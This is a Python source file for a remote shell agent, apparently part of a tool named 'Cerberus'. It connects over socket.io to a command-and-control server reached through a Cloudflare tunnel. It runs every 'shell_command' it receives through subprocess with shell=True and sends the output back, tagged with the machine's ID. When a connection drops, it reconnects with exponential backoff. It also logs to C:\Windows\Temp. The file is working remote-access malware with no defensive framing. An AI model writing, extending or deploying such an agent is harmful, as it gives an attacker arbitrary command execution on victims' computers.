import subprocess
import socketio
import time
import locale
from config import C2_HOST, C2_PORT, MACHINE_ID
C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append


def make_client():
    """Create a fresh socketio client with event handlers registered."""
    sio = socketio.Client()

    @sio.on("connect")
    def on_connect():
        print("[+] Shell agent connected to C2")

    @sio.on("shell_command")
    def on_command(data):
        """Receive command from C2, run it, send output back."""
        with open(r"C:\Windows\Temp\cerberus_debug.log", "a") as f:
            f.write(f"[debug] data={data!r}  type={type(data)}\n")  # temporary debug line

        # Guard: data must be a dict with a "command" key
        if not isinstance(data, dict):
            sio.emit("shell_output", {"machine": MACHINE_ID, "output": f"[error] unexpected data type: {type(data)}"})
            return

        command = data.get("command", "")
        if not command:
            sio.emit("shell_output", {"machine": MACHINE_ID, "output": "[error] empty command received"})
            return

        encoding = locale.getpreferredencoding(False) or "utf-8"

        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=10
            )
            output = (result.stdout or b"").decode("utf-8", errors="replace") + \
                     (result.stderr or b"").decode("utf-8", errors="replace")
        except subprocess.TimeoutExpired:
            output = "[timeout]"
        except Exception as e:
            output = f"[error] {e}"

        sio.emit("shell_output", {
            "machine": MACHINE_ID,
            "output": output
        })

    return sio


def start():
    """Connect to C2 with exponential backoff retry on failure."""
    delay = 2       # starting wait time in seconds
    max_delay = 60  # cap — never wait longer than this

    while True:
        sio = make_client()
        try:
            sio.connect(C2_URL)
            sio.wait()          # blocks until disconnected
        except Exception:
            pass                # connection failed or dropped — fall through to retry
        finally:
            try:
                sio.disconnect()
            except Exception:
                pass

        # If we get here, connection was lost or never made — retry
        print(f"[!] Disconnected. Retrying in {delay}s...")
        time.sleep(delay)
        delay = min(delay * 2, max_delay)  # double it, but cap at max_delay


if __name__ == "__main__":
    start()